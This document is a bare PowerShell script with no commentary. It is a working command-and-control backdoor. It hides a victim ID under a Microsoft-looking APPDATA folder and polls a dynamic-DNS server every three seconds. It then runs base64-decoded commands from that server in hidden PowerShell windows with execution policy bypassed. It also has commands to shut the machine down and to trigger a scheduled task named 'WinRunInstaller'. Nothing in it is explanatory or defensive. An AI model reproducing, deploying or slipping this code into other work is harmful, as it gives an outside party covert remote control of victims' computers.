$m1 = New-Object System.Threading.Mutex($false, "run.exe")
if (-not $m1.WaitOne(0)) { exit }

$m2 = New-Object System.Threading.Mutex($false, "run.ps1")
if (-not $m2.WaitOne(0)) { exit }

$VPS_POLL_URL = "http://runx.ddns.net/api/poll"

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"
if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}
$uniqueUser = "$($env:USERNAME)-$uniqueId-W"

try {
  while ($true) {
    try {
      $u = "$VPS_POLL_URL?username=$uniqueUser"
      $r = Invoke-RestMethod -Method Get -Uri $u

      if ($r.run -eq $true) {
        $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd))

        if ($c -match "panic") {
          exit
        }
        elseif ($c -match "altf4") {
          Start-Process shutdown -ArgumentList "/s", "/t", "0" 
        }
        elseif ($c -match "sauce") {
          Start-ScheduledTask -TaskName "WinRunInstaller"
        }
        else {
          $style = if ($r.visible -eq $true) { "Normal" } else { "Hidden" }
          Start-Process powershell.exe -ArgumentList @("-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", $c) -WindowStyle $style
        }
      }
    }
    catch {}

    Start-Sleep -Seconds 3
  }
}
finally {
  if ($m1) {
    $m1.ReleaseMutex()
    $m1.Dispose()
  }
  if ($m2) {
    $m2.ReleaseMutex()
    $m2.Dispose()
  }
}
